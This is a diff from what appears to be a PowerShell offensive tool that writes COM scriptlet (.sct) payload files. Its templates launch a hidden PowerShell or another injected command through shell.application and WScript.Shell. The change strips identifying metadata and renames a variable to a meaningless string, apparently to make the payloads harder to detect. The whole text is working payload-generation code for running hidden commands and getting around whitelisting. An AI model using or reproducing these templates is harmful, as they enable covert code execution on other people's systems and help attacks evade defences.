@@ -73,37 +73,17 @@ function rg_sct
     $snippet = '<?XML version="1.0"?>
 <scriptlet>
 
-<registration
-    description="Bandit"
-    progid="Bandit"
-    version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-    >   
-    <script language="VBScript">
-        <![CDATA[
-            Sub Exec()
-            Dim objShell
-            set objShell = CreateObject("shell.application")
-            objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
-            End Sub
-            Exec()
-        ]]>
-    </script>
-</registration>
-<public>
-    <method name="Exec"></method>
-</public>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
 <script language="VBScript">
-    <![CDATA[
-        Sub Exec()
-        Dim objShell
-        set objShell = CreateObject("shell.application")
-        objShell.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
-        End Sub
-        Exec()
-    ]]>
+Dim ghgfhgfh
+set ghgfhgfh = CreateObject("shell.application")
+ghgfhgfh.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
 </script>
 
+</registration>
 </scriptlet>'
 
     $RGSCTFile = "$global:newdir\payloads\rg_sct.xml"
@@ -122,21 +102,14 @@ function cs_sct
     $snippet2 = '<?XML version="1.0"?>
 <scriptlet>
 
-<registration
-    description="Bandit"
-    progid="Bandit"
-    version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-    remotable="true"
-	>
-
+<registration 
+    progid="Y"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+</registration>
 
 <script language="JScript">
-<![CDATA[
-    var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");	
-]]>
+var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'",0);	
 </script>
-</registration>
 
 </scriptlet>'
 
